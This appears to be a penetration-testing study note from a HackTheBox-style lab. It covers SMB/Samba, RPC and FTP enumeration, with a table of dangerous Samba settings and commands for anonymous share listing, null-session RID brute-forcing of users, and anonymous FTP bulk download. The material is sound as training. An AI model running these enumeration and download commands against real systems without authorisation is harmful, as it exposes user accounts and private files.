&lt;hr /&gt;
&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Server Message Block&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB&lt;/code&gt;) is a client-server protocol that regulates access to files and entire directories and other network resources such as printers, routers, or interfaces released for the network. Information exchange between different system processes can also be handled based on the SMB protocol. &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-smb/f210069c-7086-4dc2-885e-861d837df688&quot;&gt;SMB&lt;/a&gt;&lt;/strong&gt; first became available to a broader public, for example, as part of the OS/2 network operating system LAN Manager and LAN Server. Since then, the main application area of the protocol has been the Windows operating system series in particular, whose network services support SMB in a downward-compatible manner - which means that devices with newer editions can easily communicate with devices that have an older Microsoft operating system installed. With the free software project Samba, there is also a solution that enables the use of SMB in Linux and Unix distributions and thus cross-platform communication via SMB.&lt;/p&gt;

&lt;p&gt;An SMB server can provide arbitrary parts of its local file system as shares. Therefore the hierarchy visible to a client is partially independent of the structure on the server. Access rights are defined by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Access Control Lists&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ACL&lt;/code&gt;). They can be controlled in a fine-grained manner based on attributes such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execute&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;full access&lt;/code&gt; for individual users or user groups. The &lt;strong&gt;ACL&lt;/strong&gt; are defined based on the shares and therefore do not correspond to the rights assigned locally on the server.&lt;/p&gt;

&lt;h2 id=&quot;samba&quot;&gt;Samba&lt;/h2&gt;
&lt;p&gt;![[smb_protocols.png]]
As mentioned earlier, there is an alternative implementation of the SMB server called Samba, which is developed for Unix-based operating systems. Samba implements the Common Internet File System (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CIFS&lt;/code&gt;) network protocol. &lt;a href=&quot;https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-cifs/934c2faa-54af-4526-ac74-6a24d126724e&quot;&gt;CIFS&lt;/a&gt; is a dialect of SMB, meaning it is a specific implementation of the SMB protocol originally created by Microsoft. This allows Samba to communicate effectively with newer Windows systems. Therefore, it is often referred to as SMB/CIFS.&lt;/p&gt;

&lt;p&gt;However, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CIFS&lt;/code&gt; is considered a specific version of the SMB protocol, primarily aligning with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB version 1&lt;/code&gt;. When SMB commands are transmitted over Samba to an older NetBIOS service, connections typically occur over TCP ports &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;137&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;138&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;139&lt;/code&gt;. In contrast, CIFS operates over TCP port &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;445&lt;/code&gt; exclusively. There are several versions of SMB, including newer versions like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB 2&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB 3&lt;/code&gt;, which offer improvements and are preferred in modern infrastructures, while older versions like &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SMB 1&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CIFS&lt;/code&gt;) are considered outdated but may still be used in specific environments.&lt;/p&gt;

&lt;p&gt;We see global settings and two shares that are intended for printers. The global settings are the configuration of the available SMB server that is used for all shares. In the individual shares, however, the global settings can be overwritten, which can be configured with high probability even incorrectly. Let us look at some of the settings to understand how the shares are configured in Samba.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Setting&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[sharename]&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The name of the network share.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;workgroup = WORKGROUP/DOMAIN&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Workgroup that will appear when clients query.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;path = /path/here/&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The directory to which user is to be given access.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;server string = STRING&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;The string that will show up when a connection is initiated.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;unix password sync = yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Synchronize the UNIX password with the SMB password?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;usershare allow guests = yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allow non-authenticated users to access defined share?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;map to guest = bad user&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;What to do when a user login request doesn’t match a valid UNIX user?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;browseable = yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Should this share be shown in the list of available shares?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest ok = yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allow connecting to the service without using a password?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read only = yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allow users to read files only?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create mask = 0700&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;What permissions need to be set for newly created files?&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;dangerous-settings&quot;&gt;Dangerous Settings&lt;/h2&gt;

&lt;p&gt;Some of the above settings already bring some sensitive options. However, suppose we question the settings listed below and ask ourselves what the employees could gain from them, as well as attackers. In that case, we will see what advantages and disadvantages the settings bring with them. Let us take the setting &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;browseable = yes&lt;/code&gt; as an example. If we as administrators adopt this setting, the company’s employees will have the comfort of being able to look at the individual folders with the contents. Many folders are eventually used for better organization and structure. If the employee can browse through the shares, the attacker will also be able to do so after successful access.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Setting&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;browseable = yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allow listing available shares in the current share?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;read only = no&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Forbid the creation and modification of files?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;writable = yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allow users to create and modify files?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;guest ok = yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Allow connecting to the service without using a password?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enable privileges = yes&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Honor privileges assigned to specific SID?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;create mask = 0777&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;What permissions must be assigned to the newly created files?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;directory mask = 0777&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;What permissions must be assigned to the newly created directories?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logon script = script.sh&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;What script needs to be executed on the user’s login?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic script = script.sh&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Which script should be executed when the script gets closed?&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;magic output = script.out&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Where the output of the magic script needs to be stored?&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Let us create a share called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[notes]&lt;/code&gt; and a few others and see how the settings affect our enumeration process. We will use all of the above settings and apply them to this share. For example, this setting is often applied, if only for testing purposes. If it is then an internal subnet of a small team in a large department, this setting is often retained or forgotten to be reset. This leads to the fact that we can browse through all the shares and, with high probability, even download and inspect them.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;smbclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; //10.129.14.128

        Sharename       Type      Comment
        &lt;span class=&quot;nt&quot;&gt;---------&lt;/span&gt;       &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;-------&lt;/span&gt;
        print&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;         Disk      Printer Drivers
        home            Disk      INFREIGHT Samba
        dev             Disk      DEVenv
        notes           Disk      CheckIT
        IPC&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;           IPC       IPC Service &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;DEVSM&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;and to connect with notes&lt;/p&gt;
&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt; smbclient //10.129.14.128/notes
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;rpc&quot;&gt;RPC&lt;/h1&gt;

&lt;p&gt;The &lt;a href=&quot;https://www.geeksforgeeks.org/remote-procedure-call-rpc-in-operating-system/&quot;&gt;Remote Procedure Call&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RPC&lt;/code&gt;) is a concept and, therefore, also a central tool to realize operational and work-sharing structures in networks and client-server architectures. The communication process via RPC includes passing parameters and the return of a function value.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; 10.129.14.128

Enter WORKGROUP&lt;span class=&quot;se&quot;&gt;\&apos;&lt;/span&gt;s password:
rpcclient &lt;span class=&quot;nv&quot;&gt;$&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcclient&lt;/code&gt; offers us many different requests with which we can execute specific functions on the SMB server to get information. A complete list of all these functions can be found on the &lt;a href=&quot;https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html&quot;&gt;man page&lt;/a&gt; of the rpcclient.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;strong&gt;Query&lt;/strong&gt;&lt;/th&gt;
      &lt;th&gt;&lt;strong&gt;Description&lt;/strong&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;srvinfo&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Server information.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enumdomains&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Enumerate all domains that are deployed in the network.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;querydominfo&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Provides domain, server, and user information of deployed domains.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netshareenumall&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Enumerates all available shares.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netsharegetinfo &amp;lt;share&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Provides information about a specific share.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;enumdomusers&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Enumerates all domain users.&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;queryuser &amp;lt;RID&amp;gt;&lt;/code&gt;&lt;/td&gt;
      &lt;td&gt;Provides information about a specific user.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;500 1100&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;rpcclient &lt;span class=&quot;nt&quot;&gt;-N&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt; 10.129.14.128 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;queryuser 0x&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;%x\n&apos;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;User Name&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;user_rid&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\|&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;group_rid&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;done

        &lt;/span&gt;User Name   :   sambauser
        user_rid :      0x1f5
        group_rid:      0x201
    
        User Name   :   c0der
        user_rid :      0x3e8
        group_rid:      0x201
    
        User Name   :   other_User
        user_rid :      0x3e9
        group_rid:      0x201
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;An alternative to this would be a Python script from &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket&quot;&gt;Impacket&lt;/a&gt; called &lt;a href=&quot;https://github.com/SecureAuthCorp/impacket/blob/master/examples/samrdump.py&quot;&gt;samrdump.py&lt;/a&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;samrdump.py 10.129.14.128
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The information we have already obtained with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;rpcclient&lt;/code&gt; can also be obtained using other tools. For example, the &lt;a href=&quot;https://github.com/ShawnDEvans/smbmap&quot;&gt;SMBMap&lt;/a&gt; and &lt;a href=&quot;https://github.com/Pennyw0rth/NetExec&quot;&gt;NetExec&lt;/a&gt; tools are also widely used and helpful for the enumeration of SMB services.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;ftp-1&quot;&gt;FTP&lt;/h1&gt;
&lt;p&gt;#ftp&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;File Transfer Protocol&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FTP&lt;/code&gt;) is one of the oldest protocols on the Internet. The FTP runs within the application layer of the TCP/IP protocol stack. Thus, it is on the same layer as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTP&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;POP&lt;/code&gt;. These protocols also work with the support of browsers or email clients to perform their services. There are also special FTP programs for the File Transfer Protocol. 
NB: First, the client and server establish a control channel through &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP port 21&lt;/code&gt;. The client sends commands to the server, and the server returns status codes. Then both communication participants can establish the data channel via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TCP port 20&lt;/code&gt;. This channel is used exclusively for data transmission.
  A distinction is made between &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;active&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passive&lt;/code&gt; FTP. In the active variant, the client establishes the connection as described via TCP port 21 However, if a firewall protects the client, the server cannot reply because all external connections are blocked. For this purpose, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passive mode&lt;/code&gt; has been developed.&lt;/p&gt;

&lt;h3 id=&quot;tftp-1&quot;&gt;TFTP&lt;/h3&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Trivial File Transfer Protocol&lt;/code&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;TFTP&lt;/code&gt;) is simpler than FTP and performs file transfers between client and server processes. However, it &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;does not&lt;/code&gt; provide user authentication and other valuable features supported by FTP. In addition, while FTP uses TCP, TFTP uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;UDP&lt;/code&gt;, making it an unreliable protocol and causing it to use UDP-assisted application layer recovery.&lt;/p&gt;

&lt;p&gt;This is reflected, for example, in the fact that TFTP, unlike FTP, does not require the user’s authentication. It does not support protected login via passwords and sets limits on access based solely on the read and write permissions of a file in the operating system. Practically, this leads to TFTP operating exclusively in directories and with files that have been shared with all users and can be read and written globally. Because of the lack of security, TFTP, unlike FTP, may only be used in local and protected networks.&lt;/p&gt;

&lt;p&gt;FTP&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ftp 10.129.14.136

Connected to 10.129.14.136.
220 &lt;span class=&quot;s2&quot;&gt;&quot;Welcome  vsFTP service.&quot;&lt;/span&gt;
Name &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.129.14.136:cry0l1t3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;: anonymous

230 Login successful.
Remote system &lt;span class=&quot;nb&quot;&gt;type &lt;/span&gt;is UNIX.
Using binary mode to transfer files.


ftp&amp;gt; &lt;span class=&quot;nb&quot;&gt;ls

&lt;/span&gt;200 PORT &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;successful. Consider using PASV.
150 Here comes the directory listing.
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;    1 1002     1002      8138592 Sep 14 16:54 Calender.pptx
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Clients
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Documents
drwxrwxr-x    2 1002     1002         4096 Sep 14 16:50 Employees
&lt;span class=&quot;nt&quot;&gt;-rw-rw-r--&lt;/span&gt;    1 1002     1002           41 Sep 14 16:45 Important Notes.txt
226 Directory send OK.

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Download All ftp Available Files:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;c0derpwner@htb[/htb]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--no-passive&lt;/span&gt; ftp://anonymous:anonymous@10.129.14.136

&lt;span class=&quot;nt&quot;&gt;--2021-09-19&lt;/span&gt; 14:45:58--  ftp://anonymous:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;password&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;@10.129.14.136/                                         
           &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; ‘10.129.14.136/.listing’                                                                     
Connecting to 10.129.14.136:21... connected.                                                               
Logging &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;as anonymous ... Logged &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; SYST ... &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; PWD ... &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; TYPE I ... &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;  &lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; CWD not needed.
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; PORT ... &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; LIST ... &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                 
12.12.1.136/.listing           &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; &amp;lt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;                                  &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;     466  &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;.-KB/s    &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0s       
                                                                                                         
2021-09-19 14:45:58 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;65,8 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - ‘10.129.14.136/.listing’ saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;466]                                     
&lt;span class=&quot;nt&quot;&gt;--2021-09-19&lt;/span&gt; 14:45:58--  ftp://anonymous:&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;password&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;@10.129.14.136/Calendar.pptx   
           &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; ‘10.129.14.136/Calendar.pptx’                                       
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; CWD not required.                                                           
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; SIZE Calendar.pptx ... &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                                                                            
&lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; PORT ... &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;    &lt;span class=&quot;o&quot;&gt;==&amp;gt;&lt;/span&gt; RETR Calendar.pptx ... &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;       

...SNIP...

2021-09-19 14:45:58 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;48,3 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - ‘10.129.14.136/Employees/.listing’ saved &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;119]

FINISHED &lt;span class=&quot;nt&quot;&gt;--2021-09-19&lt;/span&gt; 14:45:58--
Total wall clock &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;: 0,03s
Downloaded: 15 files, 1,7K &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;0,001s &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;3,02 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h1 id=&quot;nfs&quot;&gt;NFS&lt;/h1&gt;

&lt;p&gt;#nfs #nfs-mount&lt;/p&gt;

